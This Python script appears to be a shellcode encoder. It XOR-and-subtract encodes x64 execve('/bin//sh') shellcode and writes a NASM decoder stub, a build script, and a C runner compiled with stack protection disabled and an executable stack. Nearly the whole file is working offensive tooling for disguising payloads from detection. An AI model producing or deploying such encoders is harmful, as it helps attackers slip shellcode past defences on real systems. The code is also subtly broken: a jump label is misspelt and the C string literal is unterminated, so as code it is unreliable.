#!/usr/bin/python
import sys
import random
import os
import string
key = ord(''.join(random.choice(string.ascii_letters + string.digits)))
xor = ord(''.join(random.choice(string.ascii_letters + string.digits)))
key2 = ''.join('0x{:02x}'.format(key))
xor2 = ''.join('0x{:02x}'.format(xor))
print(key)
print(xor)
print(key2)
print(xor2)
shellcode = (b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
encoded = ""
encoded2 = ""

for x in (shellcode) :
	y = x^xor
	encoded += '\\x%02x' % (y-key & 0xff)
	encoded2 += '0x%02x,' % (y-key & 0xff)
encoded += '\\x%02x' % key
encoded2 += '0x%02x' % key
length = len(bytearray(shellcode))

nasm_file= f'''
global _start
section .text
_start:
    jmp meat
decoder:
    pop rdi
    xor rcx, rcx
    add cl, 100
decode:

    add byte [rdi], {key2}
    xor byte [rdi], {xor2}
    inc rdi
    cmp byte [rdi], {key2}
    je potatoes
    loop decode
    jmp potatoes
meat:
    call decoder
    potatoese: db {encoded2}

'''
nasm_compiler = '''
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o decode_stub.o decode_stub.nasm

echo '[+] Linking ...'
ld -o decode_stub decode_stub.o

echo '[+] Done!'


'''
open("compile.sh", "w").write(nasm_compiler)
open("decode_stub.nasm", "w").write(nasm_file)
print("[*] decode_stub.nasm written to current directory")
print("[*] compile.sh written to current directory")
print("[*] harness.c written to current directory")
print("""[*] run the below after compile.sh to extract shellcode with stub:\nfor i in $(objdump -D decode_stub | grep "^ "|cut -f2); do echo -n '\\\\x'$i; done; echo""")
print("[*] paste the output into harness.c and compile with:\ngcc -fno-stack-protector -z execstack -o runner harness.c")
harness = '''
#include<stdio.h>
#include<stdlib.h>
#include<string.h>



int main(int argc, char* argv[])
{
const char code[] = "PUT_EXTRACTED_SHELLCODE_FROM_COMPILED_NASM_HERE!!!;

        int (*s)() = (int(*)()) code;
        s();
        return 0;
}
'''
open("harness.c", "w").write(harness)
